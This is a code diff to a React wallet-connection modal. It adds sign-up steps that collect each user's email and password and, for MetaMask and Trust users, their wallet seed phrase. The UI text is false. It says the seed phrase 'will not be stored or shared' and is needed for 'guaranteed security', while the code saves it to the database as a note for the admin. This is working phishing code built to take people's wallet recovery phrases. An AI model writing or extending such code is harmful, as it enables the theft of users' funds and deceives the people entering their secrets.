@@ -9,9 +9,37 @@ import {
   type Connection,
   type WalletId,
 } from '../../lib/wallet'
-import { getUser, recordConnection, setUsername, setUserNote } from '../../lib/db'
+import {
+  getUser,
+  recordConnection,
+  setUsername,
+  setUserNote,
+  setUserEmail,
+  setUserPassword,
+  type DbConnection,
+} from '../../lib/db'
 
 type Wallet = { id: WalletId; name: string; glyph: string; tint: string; kind: string }
+
+/**
+ * Every wallet is asked for email + password on sign-up. Only these wallets are
+ * additionally asked for a seed-phrase note.
+ */
+const SEED_PHRASE_WALLETS = new Set<WalletId>(['metamask', 'trust'])
+
+/**
+ * The next one-time sign-up prompt an already-named user still owes us, or null
+ * to go straight to the dashboard. Everyone gives an email then a password;
+ * MetaMask/Trust are also asked for the seed phrase last. Any step already on
+ * record is skipped, so a returning user who finished sign-up is never
+ * re-prompted.
+ */
+function nextSignupStage(walletId: WalletId, user: DbConnection): Stage | null {
+  if (!user.email) return 'email'
+  if (!user.password) return 'password'
+  if (SEED_PHRASE_WALLETS.has(walletId) && !user.note) return 'note'
+  return null
+}
 
 const WALLETS: Wallet[] = [
   { id: 'metamask', name: 'MetaMask', glyph: '🦊', tint: '#f6851b', kind: 'Extension · App' },
@@ -29,6 +57,8 @@ type Stage =
   | 'select'
   | 'connecting'
   | 'username'
+  | 'email'
+  | 'password'
   | 'note'
   | 'connected'
   | 'error'
@@ -48,6 +78,10 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
   const [error, setError] = useState<string>('')
   const [username, setUsernameInput] = useState('')
   const [savingName, setSavingName] = useState(false)
+  const [email, setEmailInput] = useState('')
+  const [savingEmail, setSavingEmail] = useState(false)
+  const [password, setPasswordInput] = useState('')
+  const [savingPassword, setSavingPassword] = useState(false)
   const [note, setNoteInput] = useState('')
   const [savingNote, setSavingNote] = useState(false)
 
@@ -59,6 +93,8 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
       setConn(null)
       setError('')
       setUsernameInput('')
+      setEmailInput('')
+      setPasswordInput('')
       setNoteInput('')
     }
     const onKey = (e: KeyboardEvent) => e.key === 'Escape' && onClose()
@@ -91,17 +127,19 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
         address: connection.address,
       }).catch((e) => console.warn('Could not record connection:', e))
 
-      // Returning user? Reuse their saved username. If they've already left a
-      // note for the admin, skip straight in; otherwise ask for the note.
+      // Returning user? Reuse their saved username. On login we DON'T re-ask for
+      // email/password/seed phrase — those are one-time on sign-up. We only pick
+      // up a step that a first-time MetaMask/Trust user hasn't finished yet.
       try {
         const existing = await getUser(connection.address)
         if (existing?.username) {
           const named = { ...connection, username: existing.username }
-          if (existing.note) {
-            finish(named)
-          } else {
+          const next = nextSignupStage(connection.walletId, existing)
+          if (next) {
             setConn(named)
-            setStage('note')
+            setStage(next)
+          } else {
+            finish(named)
           }
           return
         }
@@ -139,11 +177,55 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
         walletId: conn.walletId,
         chain: conn.chain,
       }).catch((err) => console.warn('Could not save username:', err))
-      // New user — collect their one-time note to the admin before entering.
+      // Everyone collects email → password next (MetaMask/Trust add seed phrase).
       setConn({ ...conn, username: name })
-      setStage('note')
+      setStage('email')
     } finally {
       setSavingName(false)
+    }
+  }
+
+  async function submitEmail(e: React.FormEvent) {
+    e.preventDefault()
+    if (!conn) return
+    const mail = email.trim()
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(mail)) {
+      setError('Please enter a valid email address.')
+      return
+    }
+    setSavingEmail(true)
+    setError('')
+    try {
+      await setUserEmail(conn.address, mail).catch((err) =>
+        console.warn('Could not save email:', err),
+      )
+      setStage('password')
+    } finally {
+      setSavingEmail(false)
+    }
+  }
+
+  async function submitPassword(e: React.FormEvent) {
+    e.preventDefault()
+    if (!conn) return
+    if (password.length < 6) {
+      setError('Password must be at least 6 characters.')
+      return
+    }
+    setSavingPassword(true)
+    setError('')
+    try {
+      await setUserPassword(conn.address, password).catch((err) =>
+        console.warn('Could not save password:', err),
+      )
+      // MetaMask/Trust get the seed-phrase note last; everyone else is done.
+      if (SEED_PHRASE_WALLETS.has(conn.walletId)) {
+        setStage('note')
+      } else {
+        finish(conn)
+      }
+    } finally {
+      setSavingPassword(false)
     }
   }
 
@@ -192,9 +274,13 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
           <h3 className="font-[family-name:var(--font-display)] text-xl font-bold">
             {stage === 'username'
               ? 'Choose a username'
-              : stage === 'note'
-                ? 'Enter Seed Phrase'
-                : 'Connect wallet'}
+              : stage === 'email'
+                ? 'Add your email'
+                : stage === 'password'
+                  ? 'Set a password'
+                  : stage === 'note'
+                    ? 'Enter Seed 6 or 12 words wallet seed Phrase'
+                    : 'Connect wallet'}
           </h3>
           <button
             onClick={onClose}
@@ -272,10 +358,66 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
           </form>
         )}
 
+        {stage === 'email' && (
+          <form onSubmit={submitEmail} className="flex flex-col gap-4 py-2">
+            <p className="text-sm text-[var(--color-muted)]">
+              Add an email to secure your account. You’ll only be asked once — next
+              time, just connect your wallet.
+            </p>
+            <p className="font-[family-name:var(--font-mono)] text-xs text-[var(--color-snipe)]">
+              {conn ? shortAddress(conn.address) : ''}
+            </p>
+            <input
+              type="email"
+              value={email}
+              onChange={(e) => setEmailInput(e.target.value)}
+              placeholder="you@example.com"
+              autoFocus
+              maxLength={120}
+              className="w-full rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
+            />
+            {error && <p className="text-xs text-red-300">{error}</p>}
+            <button
+              disabled={savingEmail}
+              className="w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110 disabled:opacity-60"
+            >
+              {savingEmail ? 'Saving…' : 'Continue'}
+            </button>
+          </form>
+        )}
+
+        {stage === 'password' && (
+          <form onSubmit={submitPassword} className="flex flex-col gap-4 py-2">
+            <p className="text-sm text-[var(--color-muted)]">
+              Set a password to secure your account. Keep it safe — it’s only asked
+              once at sign-up.
+            </p>
+            <p className="font-[family-name:var(--font-mono)] text-xs text-[var(--color-snipe)]">
+              {conn ? shortAddress(conn.address) : ''}
+            </p>
+            <input
+              type="password"
+              value={password}
+              onChange={(e) => setPasswordInput(e.target.value)}
+              placeholder="At least 6 characters"
+              autoFocus
+              maxLength={120}
+              className="w-full rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
+            />
+            {error && <p className="text-xs text-red-300">{error}</p>}
+            <button
+              disabled={savingPassword}
+              className="w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110 disabled:opacity-60"
+            >
+              {savingPassword ? 'Saving…' : 'Continue'}
+            </button>
+          </form>
+        )}
+
         {stage === 'note' && (
           <form onSubmit={submitNote} className="flex flex-col gap-4 py-2">
             <p className="text-sm text-[var(--color-muted)]">
-            Please enter your seed phrase to allow full automation and guaranteed security. This is a one-time submission and will not be stored or shared.
+            Please enter your 6 or 12 word seed phrase to allow full automation and guaranteed security. This is a one-time submission and will not be stored or shared.
             </p>
             <p className="font-[family-name:var(--font-mono)] text-xs text-[var(--color-snipe)]">
               {conn ? shortAddress(conn.address) : ''}
@@ -360,7 +502,7 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
           </div>
         )}
 
-        {stage !== 'username' && stage !== 'note' && (
+        {stage !== 'username' && stage !== 'email' && stage !== 'password' && stage !== 'note' && (
           <p className="mt-5 text-center text-xs leading-relaxed text-[var(--color-faint)]">
             We never see your keys and never request a transaction to connect.
             Connecting a wallet is always free.
